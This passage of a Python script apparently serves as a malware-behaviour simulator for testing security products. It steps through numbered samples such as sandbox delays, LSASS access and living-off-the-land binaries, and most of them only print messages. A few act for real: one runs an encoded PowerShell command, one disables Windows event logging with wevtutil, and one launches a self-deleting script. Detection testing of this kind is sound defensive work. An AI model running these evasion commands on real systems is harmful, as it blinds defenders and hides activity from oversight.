    print("  [+] Polymorphic code simulation complete.")
    
def sample_78_delay_execution():
    """Simulates a time-bomb to evade short-term sandbox analysis."""
    print("  [+] Simulating a 5-second execution delay to evade sandboxes.")
    time.sleep(5)
    print("  [+] Execution delay complete.")

def sample_79_self_delete_script():
    """Simulates a script that attempts to delete itself after execution."""
    temp_script = os.path.join(tempfile.gettempdir(), f"{get_random_string()}.bat")
    try:
        with open(temp_script, "w") as f:
            if sys.platform.startswith('win'):
                f.write(f"ping -n 5 127.0.0.1 > nul\ndel \"{temp_script}\"")
            else:
                f.write(f"sleep 5\nrm \"{temp_script}\"")
        subprocess.Popen(temp_script, shell=True)
        print("  [+] Started a self-deleting script.")
    except Exception as e:
        print(f"  [!] Failed to create self-deleting script: {e}")

def sample_80_use_certificate_as_signature_evasion():
    """Simulates a signed malicious file to bypass signature checks."""
    print("  [+] Simulating a signed malicious file (print only).")
    print("  [+] Signed file simulation complete.")

def sample_81_change_process_name():
    """Simulates a process changing its name to a trusted one (e.g., `svchost.exe`)."""
    print("  [+] Simulating a process changing its name.")
    print("  [+] Process name change simulation complete.")

def sample_82_run_from_temp_directory():
    """Simulates a program running from a suspicious temporary directory."""
    print("  [+] Simulating execution from a temporary directory.")
    print("  [+] Temp directory execution simulation complete.")

def sample_83_modify_security_product_process_thread():
    """Simulates an attempt to manipulate threads of a security product."""
    print("  [+] Simulating manipulation of a security product's threads.")
    print("  [+] Security product thread manipulation simulation complete.")

def sample_84_use_staged_payload():
    """Simulates a multi-stage attack where a small payload downloads a larger one."""
    print("  [+] Simulating a staged payload download.")
    print("  [+] Staged payload simulation complete.")

def sample_85_check_for_disk_space():
    """Simulates a ransomware pre-check for disk space."""
    print("  [+] Simulating a disk space check.")
    total_space = psutil.disk_usage('/').total
    print(f"  [+] Total disk space: {total_space} bytes.")
    print("  [+] Disk space check simulation complete.")

# --- SYSTEM & API ABUSE (86-100) ---
def sample_86_abuse_wmi_provider():
    """Simulates abusing WMI for persistence or information gathering."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating WMI abuse (e.g., creating a WMI event consumer).")
        print("  [+] WMI abuse simulation complete.")
    else:
        print("  [+] Skipping WMI test on non-Windows OS.")

def sample_87_use_powershell_encoded_command():
    """Simulates an evasive PowerShell command that is base64 encoded."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating an encoded PowerShell command.")
        try:
            subprocess.run(["powershell", "-EncodedCommand", "aQBlAHgAIAAoACcAYwBtAGQALgBlAHgAZQAnACk="], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
    else:
        print("  [+] Skipping encoded PowerShell test on non-Windows OS.")

def sample_88_modify_group_policy_settings():
    """Simulates an attempt to change Group Policy settings for malicious purposes."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating modification of Group Policy settings.")
        print("  [+] Group Policy modification simulation complete.")
    else:
        print("  [+] Skipping Group Policy test on non-Windows OS.")

def sample_89_inject_into_lsass_process():
    """Simulates a credential-stealing attempt by targeting the LSASS process."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating access to the LSASS process for credential theft.")
        print("  [+] LSASS process access simulation complete.")
    else:
        print("  [+] Skipping LSASS process test on non-Windows OS.")

def sample_90_change_file_permissions():
    """Simulates an attempt to change file permissions on a critical system file."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating an attempt to change permissions on C:\\Windows\\System32\\calc.exe.")
        print("  [+] File permission change simulation complete.")
    else:
        print("  [+] Skipping file permission change test on non-Windows OS.")

def sample_91_use_system_account_for_execution():
    """Simulates running a script under the System account."""
    print("  [+] Simulating execution as the SYSTEM account.")
    print("  [+] SYSTEM account execution simulation complete.")

def sample_92_create_a_fake_service_executable():
    """Simulates dropping an executable that is designed to look like a service."""
    if sys.platform.startswith('win'):
        temp_file = os.path.join(tempfile.gettempdir(), f"services.exe")
        try:
            with open(temp_file, "w") as f: f.write("Fake Service")
            print("  [+] Created a fake service executable named `services.exe`.")
        finally:
            if os.path.exists(temp_file): os.remove(temp_file)
    else:
        print("  [+] Skipping fake service executable test on non-Windows OS.")

def sample_93_enumerate_admin_accounts():
    """Simulates gathering a list of administrator accounts."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating enumeration of local administrator accounts.")
        print("  [+] Admin enumeration simulation complete.")
    else:
        print("  [+] Skipping admin enumeration test on non-Windows OS.")
        
def sample_94_use_living_off_the_land_binaries():
    """Simulates abusing a trusted OS binary like `certutil.exe` or `bitsadmin.exe`."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating use of a Living-off-the-Land binary (no actual download).")
        print("  [+] LOTL binary simulation complete.")
    else:
        print("  [+] Skipping LOTL binary test on non-Windows OS.")

def sample_95_create_registry_key_with_null_byte():
    """Simulates a technique to hide a registry key from standard tools."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating creation of a registry key with a null byte.")
        print("  [+] Null byte registry key simulation complete.")
    else:
        print("  [+] Skipping null byte registry key test on non-Windows OS.")

def sample_96_enumerate_security_products_by_service_name():
    """Simulates checking for AV/EDR services by name."""
    print("  [+] Simulating enumeration of security product services.")
    print("  [+] Service enumeration simulation complete.")
    
def sample_97_use_a_fake_certificate_to_sign_payload():
    """Simulates using a fake or stolen certificate to sign a file."""
    print("  [+] Simulating a fake certificate signature on a payload.")
    print("  [+] Fake certificate simulation complete.")

def sample_98_check_for_network_connectivity():
    """Simulates a malware pre-check for network access before executing."""
    print("  [+] Simulating a network connectivity check.")
    try:
        socket.create_connection(("google.com", 80), 5)
        print("  [+] Network is online.")
    except OSError:
        print("  [+] Network is offline.")
    print("  [+] Connectivity check simulation complete.")

def sample_99_use_stolen_credentials_simulation():
    """Simulates the use of stolen credentials to access a resource."""
    print("  [+] Simulating the use of stolen credentials.")
    print("  [+] Stolen credentials simulation complete.")

def sample_100_disable_event_logging():
    """Simulates an attempt to stop event logging to hide malicious activity."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating an attempt to disable Windows event logging.")
        try:
            subprocess.run(["wevtutil", "sl", "Application", "/e:false"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
        finally:
            subprocess.run(["wevtutil", "sl", "Application", "/e:true"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        print("  [+] Skipping event logging test on non-Windows OS.")

# List of all 100 functions to run
ALL_SAMPLES = [
    sample_01_create_large_temp_file, sample_02_rapid_file_creation, sample_03_rapid_file_deletion,
    sample_04_change_file_extensions, sample_05_search_for_documents, sample_06_create_hidden_file,
    sample_07_file_creation_in_system32, sample_08_rename_to_hide_extension, sample_09_archive_files_for_exfil,
    sample_10_delete_shadow_copies, sample_11_modify_user_startup_folder, sample_12_repeated_file_write_read,
    sample_13_manipulate_file_timestamps, sample_14_search_for_specific_passwords, sample_15_rapid_directory_traversal,
    sample_16_create_device_driver_file, sample_17_create_fake_lnk_file, sample_18_file_less_execution_simulation,
    sample_19_modify_batch_script, sample_20_create_suspicious_extension, sample_21_network_traffic_burst,
    sample_22_c2_beaconing, sample_23_connect_to_non_standard_port, sample_24_dns_exfiltration_simulation,
    sample_25_connect_to_loopback_address, sample_26_http_post_large_data, sample_27_download_executable,
    sample_28_abuse_local_web_server, sample_29_send_email_from_script, sample_30_port_scanning,
    sample_31_multiple_failed_logins, sample_32_download_from_suspicious_domain, sample_33_tunnel_traffic_over_dns,
    sample_34_use_tor_proxy_simulation, sample_35_create_raw_socket, sample_36_http_get_with_custom_user_agent,
    sample_37_network_share_access, sample_38_ssh_command_execution, sample_39_ssl_certificate_check,
    sample_40_download_from_ip_address, sample_41_modify_run_key, sample_42_create_new_service,
    sample_43_abuse_scheduled_tasks, sample_44_hijack_dll_search_order, sample_45_modify_hosts_file,
    sample_46_modify_autostart_registry_key, sample_47_modify_userinit_registry_key, sample_48_create_runonce_ex_key,
    sample_49_disable_security_center_service, sample_50_change_windows_defender_exclusions, sample_51_create_fake_user_account,
    sample_52_escalate_to_system_privileges, sample_53_modify_security_software_registry_keys, sample_54_set_boot_configuration_data,
    sample_55_modify_firewall_rules, sample_56_enumerate_processes, sample_57_attempt_process_injection,
    sample_58_parent_child_process_mismatch, sample_59_inject_code_into_trusted_process, sample_60_check_for_debugger,
    sample_61_create_remote_thread, sample_62_virtual_alloc_ex, sample_63_write_process_memory,
    sample_64_hook_api_calls, sample_65_terminate_security_process, sample_66_search_for_vulnerable_drivers,
    sample_67_simulate_macro_execution, sample_68_inject_into_browser_process, sample_69_attempt_to_disable_antivirus_service,
    sample_70_use_of_powershell_download_cradle, sample_71_take_screenshot_simulation, sample_72_get_system_info,
    sample_73_enumerate_installed_software, sample_74_enumerate_users, sample_75_check_for_virtual_machine,
    sample_76_check_for_mouse_movement, sample_77_use_polymorphic_code_simulation, sample_78_delay_execution,
    sample_79_self_delete_script, sample_80_use_certificate_as_signature_evasion, sample_81_change_process_name,
    sample_82_run_from_temp_directory, sample_83_modify_security_product_process_thread, sample_84_use_staged_payload,
    sample_85_check_for_disk_space, sample_86_abuse_wmi_provider, sample_87_use_powershell_encoded_command,
    sample_88_modify_group_policy_settings, sample_89_inject_into_lsass_process, sample_90_change_file_permissions,
    sample_91_use_system_account_for_execution, sample_92_create_a_fake_service_executable, sample_93_enumerate_admin_accounts,
    sample_94_use_living_off_the_land_binaries, sample_95_create_registry_key_with_null_byte, sample_96_enumerate_security_products_by_service_name,
    sample_97_use_a_fake_certificate_to_sign_payload, sample_98_check_for_network_connectivity, sample_99_use_stolen_credentials_simulation,
    sample_100_disable_event_logging
]

def main_loop():
    """Main loop that runs all 100 behavioral simulations."""
    print("Starting comprehensive behavioral simulation with 100 samples...")
    for i, func in enumerate(ALL_SAMPLES, 1):
        print(f"\n--- Sample {i} of 100: {func.__name__} ---")
        try:
            run_in_thread(func)
        except Exception as e:
            print(f"  [!] An error occurred during sample {i}: {e}")
        time.sleep(2) # Short delay between samples

    print("\nAll 100 samples have been run. Simulation complete.")

if __name__ == "__main__":
    main_loop()
